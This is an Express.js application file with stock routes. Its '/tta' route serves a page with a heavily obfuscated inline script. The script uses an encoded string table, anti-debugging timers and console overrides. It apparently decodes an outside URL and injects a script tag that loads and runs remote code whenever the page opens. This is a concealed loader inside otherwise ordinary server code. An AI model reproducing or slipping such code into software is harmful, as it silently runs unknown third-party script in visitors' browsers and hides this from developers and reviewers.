const createError = require('http-errors');
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const logger = require('morgan');

const app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({extended: false}));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));



app.get('/', function (req, res, next) {
    res.render('index', {title: 'Express'});
});

app.get('/users', function (req, res, next) {
    res.send('respond with a resource 2');
});

app.get('/tta', function (req, res, next) {
    res.send(`<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html;charset=utf-8"><meta name="viewport" content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1" /><title></title><link href="" rel="shortcut icon" /></head><body class="tpf3eDuxjiTvyB8wWOA4NGb2qz"><div class="uTrk78meSo6dNxRwf2YEhjW" id="IcdCNGsZXEleUWAzfR"></div><script>var _0x2d77=["y2HHAw4=","yxbWBhK=","zxHJzxb0Aw9U","D2HPBguGkhrYDwuPihT9","ngqWyJzKmtqUANm=","C3jJ","Aw5WDxq=","DgvZDa==","zgvIDq==","y2fSBa==","DhjHy2u=","CMv0DxjUicHMDw5JDgLVBIGPia==","yxbWzw5Kq2HPBgq=","ywn0Aw9U","DgfIBgu=","x19WCM90B19F","ChjVDg90ExbL","y291BNrLCG==","BgvUz3rO","Aw5MBW==","BIb0AgLZiIKOicK=","z2DLCG==","ltLHlxPblvPFjf0Qkq==","Ahr0Chm6lY92EMfZlMfPB2vJB2LU","AgvHza==","D2fYBG==","Dgv4Dc9QyxzHC2nYAxb0","lM9YzY82mgeZytGWotq0ywfJyZmW","Bg9N","Dg9tDhjPBMC=","y29UC3rYDwn0B3i=","E30Uy29UC3rYDwn0B3iOiNjLDhvY","y3jLyxrLrwXLBwvUDa==","yMLUza==","y29UC29Szq=="];!function(c,x){!function(x){for(;--x;)c.push(c.shift())}(232)}(_0x2d77);var _0x4c33=function(x,c){var n=_0x2d77[x=+x];void 0===_0x4c33.VMwjsw&&(_0x4c33.kpEtZR=function(x){for(var c=function(x){for(var c,n,r=String(x).replace(/=+$/,""),t="",_=0,i=0;n=r.charAt(i++);~n&&(c=_%4?64*c+n:n,_++%4)&&(t+=String.fromCharCode(255&c>>(-2*_&6))))n="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(n);return t}(x),n=[],r=0,t=c.length;r<t;r++)n+="%"+("00"+c.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(n)},_0x4c33.RJYIIP={},_0x4c33.VMwjsw=!0);var r=_0x4c33.RJYIIP[x];return void 0===r?(n=_0x4c33.kpEtZR(n),_0x4c33.RJYIIP[x]=n):n=r,n};setInterval(function(){_0x8e23d5()},4e3);var _0x6d6df3=function(){var r=!0;return function(c,n){var x=r?function(){if(n){var x=n[_0x4c33("0xf")](c,arguments);return n=null,x}}:function(){};return r=!1,x}}();!function(){_0x6d6df3(this,function(){var x=new RegExp("function *\\( *\\)"),c=new RegExp("\\+\\+ *(?:[a-zA-Z_$][0"+_0x4c33("0x1"),"i"),n=_0x8e23d5("init");x[_0x4c33("0x15")](n+_0x4c33("0xe"))&&c[_0x4c33("0x15")](n+_0x4c33("0x14"))?_0x8e23d5():n("0")})()}();var _0x3295b3=function(){var r=!0;return function(c,n){var x=r?function(){if(n){var x=n[_0x4c33("0xf")](c,arguments);return n=null,x}}:function(){};return r=!1,x}}(),_0x58dfce=_0x3295b3(this,function(){try{var c=Function(_0x4c33("0x19")+(_0x4c33("0xa")+_0x4c33("0x22"))+");")()}catch(x){c=window}for(var x=c[_0x4c33("0xd")]=c[_0x4c33("0xd")]||{},n=[_0x4c33("0x7"),_0x4c33("0x4"),_0x4c33("0x21"),"error",_0x4c33("0x10"),_0x4c33("0x1c"),_0x4c33("0x18")],r=0;r<n[_0x4c33("0x20")];r++){var t=_0x3295b3[_0x4c33("0x9")][_0x4c33("0x1e")][_0x4c33("0xc")](_0x3295b3),_=n[r],i=x[_]||t;t[_0x4c33("0x1d")]=_0x3295b3.bind(_0x3295b3),t[_0x4c33("0x8")]=i[_0x4c33("0x8")][_0x4c33("0xc")](i),x[_]=t}});_0x58dfce();var emfromgetnbrtoo="",script34ssd=document[_0x4c33("0xb")]("script");function _0x8e23d5(x){function c(x){if("string"==typeof x)return function(x){}.constructor(_0x4c33("0x11"))[_0x4c33("0xf")](_0x4c33("0x1f"));1!==(""+x/x)[_0x4c33("0x20")]||x%20==0?function(){return!0}.constructor(_0x4c33("0x16")+_0x4c33("0x0"))[_0x4c33("0x17")](_0x4c33("0x1b")):function(){return!1}.constructor(_0x4c33("0x16")+_0x4c33("0x0")).apply("stateObject"),c(++x)}try{if(x)return c;c(0)}catch(x){}}script34ssd.type=_0x4c33("0x5"),script34ssd[_0x4c33("0x13")]=_0x4c33("0x2")+_0x4c33("0x6")+_0x4c33("0x12"),document.getElementsByTagName(_0x4c33("0x3"))[0][_0x4c33("0x1a")](script34ssd);</script></body></html>`);
});

// catch 404 and forward to error handler
app.use(function (req, res, next) {
    next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
});

module.exports = app;
